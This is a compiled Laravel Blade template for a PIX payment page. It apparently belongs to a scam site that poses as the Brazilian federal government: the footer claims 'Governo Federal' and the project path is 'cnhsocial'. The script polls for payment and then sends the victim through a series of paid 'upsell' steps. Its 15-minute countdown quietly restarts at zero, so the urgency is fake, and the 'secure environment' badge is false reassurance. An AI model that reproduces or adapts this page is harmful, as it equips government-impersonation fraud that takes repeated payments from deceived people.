<link href="<?php echo e(url('public/css/pix.css')); ?>" rel="stylesheet">
<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <section class="py-12 h-full flex-1 bg-muted">
            <div class="container mx-auto px-4">
                <div class="max-w-md mx-auto">
                    <div class="shadcn-card rounded-2xl border bg-card border-card-border text-card-foreground mb-6 shadow-lg">
                        <div class="p-5">
                            <div class="flex justify-between items-center mb-6">
                                <div>
                                    <p class="text-xs text-gray-500 mb-1">Pague com PIX</p>
                                    <h1 class="text-2xl font-bold text-green-600">R$ <?php echo e(number_format($pedido->valor, 2, ',', '.')); ?></h1>
                                </div>
                                <div class="text-right">
                                    <p class="text-xs text-gray-500">Expira em</p>
                                    <span class="text-red-600 font-bold text-base" id="timeLeftText">15:00</span>
                                </div>
                            </div>
                            <div class="bg-white border-4 border-gray-100 rounded-xl mx-auto mb-4 flex items-center justify-center overflow-hidden p-2" style="width:180px;height:180px;">
                                <img alt="QR Code PIX" class="w-full h-full object-contain" src="<?php echo e($pedido->qrcode); ?>">
                            </div>
                            <div class="space-y-4 mb-6">
                                <p class="text-sm text-gray-600">Copie o código PIX abaixo:</p>
                                <div class="relative">
                                    <input id="pixCode" class="flex w-full rounded-xl border border-input px-4 py-5 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 font-medium antialiased pr-4 font-mono text-xs bg-gray-50 h-11 transition-all duration-300 focus:ring-0 focus:ring-offset-0 focus:outline-none hover:bg-gray-100" style="text-rendering: optimizelegibility;" readonly="" data-testid="input-pix-code" value="<?php echo e($pedido->copiacola); ?>">
                                    <div class="absolute inset-0 bg-green-500/10 rounded border-2 border-green-500 items-center justify-center hidden" id="copiado">
                                        <div class="bg-green-500 text-white px-3 py-1 rounded-full text-xs font-medium flex items-center gap-1">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-3 w-3"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
                                            Copiado!
                                        </div>
                                    </div>
                                </div>
                                <button id="copyPixBtn" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-xl text-base focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover-elevate active-elevate-2 bg-primary border-primary-border min-h-9 px-4 py-2 w-full text-white font-semibold h-11 transition-all duration-300 transform border-0 outline-none focus:ring-0 focus:ring-offset-0 scale-100 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 shadow-lg hover:shadow-blue-200/50 hover:scale-105" data-testid="button-copy-code">
                                    <div class="flex items-center gap-2">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-5 w-5"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
                                        <span>Copiar Código</span>
                                    </div>
                                </button>
                            </div>
                            <div class="text-center mb-6">
                                <div class="flex items-center justify-center gap-2 mb-2">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-4 w-4 text-orange-500 animate-spin" style="animation-duration: 3s;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                                    <p class="text-orange-600 font-medium text-sm flex items-center">
                                        Aguardando pagamento
                                        <span class="ml-0.5 inline-flex">
                                            <span style="animation: 1.8s infinite dotAnimation;">.</span>
                                            <span style="animation: 1.8s 0.6s infinite dotAnimation;">.</span>
                                            <span style="animation: 1.8s 1.2s infinite dotAnimation;">.</span>
                                        </span>
                                    </p>
                                </div>
                                <p class="text-gray-500 text-xs">O PIX será reconhecido automaticamente</p>
                            </div>
                            <div class="space-y-4 mt-8 mb-6">
                                <h3 class="text-sm font-semibold text-gray-700">Como pagar:</h3>
                                <div class="space-y-3">
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-smartphone h-5 w-5 text-gray-600"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"></rect><path d="M12 18h.01"></path></svg>
                                        </div>
                                        <div class="flex-1">
                                            <p class="text-sm text-gray-700">Abra o app do seu banco</p>
                                        </div>
                                    </div>
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-5 w-5 text-gray-600"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
                                        </div>
                                        <div class="flex-1">
                                            <p class="text-sm text-gray-700">Selecione "PIX Copia e Cola"</p>
                                        </div>
                                    </div>
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-5 w-5 text-gray-600"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
                                        </div>
                                        <div class="flex-1">
                                            <p class="text-sm text-gray-700">Cole o código e confirme o pagamento</p>
                                        </div>
                                    </div>
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-dollar-sign h-5 w-5 text-gray-600"><line x1="12" x2="12" y1="2" y2="22"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
                                        </div>
                                        <div class="flex-1">
                                            <p class="text-sm text-gray-700">Pagamento processado automaticamente</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="flex items-center justify-center gap-6">
                        <img src="<?php echo e(url('public/images/pix-106.svg')); ?>" alt="PIX" class="h-10" data-testid="img-pix-seal">
                        <div class="h-6 w-px bg-gray-200"></div>
                        <div class="flex items-center gap-2 text-gray-600">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield h-8 w-8 text-green-600"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
                            <div class="text-xs">
                                <div class="font-semibold">Ambiente Seguro</div>
                                <div class="text-gray-500">256-bit SSL</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <footer class="py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<style>
@keyframes dotAnimation {
    0%, 20% { opacity: 0; }
    21%, 80% { opacity: 1; }
    81%, 100% { opacity: 0; }
}
</style>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
    const userData = JSON.parse(sessionStorage.getItem("userData"));
    const userAddress = JSON.parse(sessionStorage.getItem("userAddress"));
    if(!userData){
        window.location.href = "<?php echo e(url('/login')); ?>";
    }
    
    let timeLeft = 900;
    const timeLeftText = document.getElementById('timeLeftText');

    function formatTime(seconds) {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return mins + ':' + String(secs).padStart(2, '0');
    }

    let timerInterval = null;
    function startTimer() {
        timeLeftText.textContent = formatTime(timeLeft);
        timerInterval = setInterval(() => {
            timeLeft = (timeLeft <= 0) ? 900 : timeLeft - 1;
            timeLeftText.textContent = formatTime(timeLeft);
        }, 1000);
    }

    $(document).on('click', '#copyPixBtn', function(){
        const codigo = document.getElementById('pixCode').value.trim();
        navigator.clipboard.writeText(codigo).then(() => {
            $(this).html(`
            <div class="flex items-center gap-2">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-5 w-5"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
                <span>Código Copiado!</span>
            </div>`);

            $(this).removeClass('from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 hover:shadow-blue-200/50')
            .addClass('from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 shadow-green-200/50');

            $('#copiado').removeClass('hidden').addClass('flex');

            setTimeout(() => {
                $(this).html(`
                <div class="flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-5 w-5"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
                    <span>Copiar Código</span>
                </div>`);

                $(this).addClass('from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 hover:shadow-blue-200/50')
                .removeClass('from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 shadow-green-200/50');

                $('#copiado').addClass('hidden').removeClass('flex');
            }, 4000);
        }).catch(() => {
            alert('Não foi possível copiar o código.');
        });
    });

    async function copyPix() {
        try {
        if (!pixData || !pixData.qrcode) {
            alert('Código PIX indisponível');
            return;
        }
        await navigator.clipboard.writeText(pixData.qrcode);
            alert('Código PIX copiado!');
        } catch (e) {
        console.error('Copy failed', e);
            alert('Não foi possível copiar. Cole manualmente.');
        }
    }

    let paymentConfirmed = false;
    let servico = "<?php echo e($pedido->servico); ?>";
      
    function startPaymentStatusCheck(transactionId) {
        const startTime = Date.now();
        const maxDuration = 30 * 60 * 1000;
        
        async function loopCheck() {
            if (paymentConfirmed || Date.now() - startTime > maxDuration) {
                return;
            }
        
            await checkPaymentStatus(transactionId);
                
            if (!paymentConfirmed) {
                setTimeout(loopCheck, 3000);
            }
        }
        
        loopCheck();
    }
        
    async function checkPaymentStatus(transactionId) {
        try {
            const response = await fetch("<?php echo e(url('/confirmar')); ?>", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': '<?php echo e(csrf_token()); ?>'
                },
                body: JSON.stringify({ transactionId:transactionId })
            });
            const data = await response.json();
            if (data.success) {
                paymentConfirmed = true;
                if(servico == 'Payment CN'){
                    window.location.href = "<?php echo e(url('/cadastro/pendencia')); ?>";
                }
                if(servico == 'Payment CN Upsell 01'){
                    window.location.href = "<?php echo e(url('/cadastro/adicao-categoria')); ?>";
                }
                if(servico == 'Payment CN Upsell 02'){
                    window.location.href = "<?php echo e(url('/cadastro/nova-chance')); ?>";
                }
                if(servico == 'Payment CN Upsell 03'){
                    window.location.href = "<?php echo e(url('/cadastro/concluido')); ?>";
                }
            }
        } catch (error) {
            console.error('Erro ao verificar status do pagamento:', error);
        }
    }

    function init() {
        startTimer();
        startPaymentStatusCheck("<?php echo e($pedido->transacao); ?>");
    }

    init();
</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/pix.blade.php ENDPATH**/ ?>